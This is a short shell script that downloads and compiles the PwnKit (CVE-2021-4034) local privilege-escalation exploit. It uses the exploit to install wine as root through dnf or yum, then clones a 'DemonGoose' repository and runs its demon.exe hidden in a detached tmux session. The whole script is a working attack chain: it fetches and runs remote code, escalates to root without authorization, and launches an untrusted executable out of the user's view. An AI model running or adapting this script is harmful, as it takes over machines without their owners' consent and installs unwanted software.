#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done
make

found=0
if [ $found -eq 0 ] && command -v dnf &> /dev/null
then
    echo "dnf install wine -qy" | ./cve-2021-4034
    found=1
fi
if [ $found -eq 0 ] && command -v yum &> /dev/null
then
    echo "yum install wine -qy" | ./cve-2021-4034
    found=1
fi

git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
tmux new -d wine DemonGoose/DemonThings/demon.exe
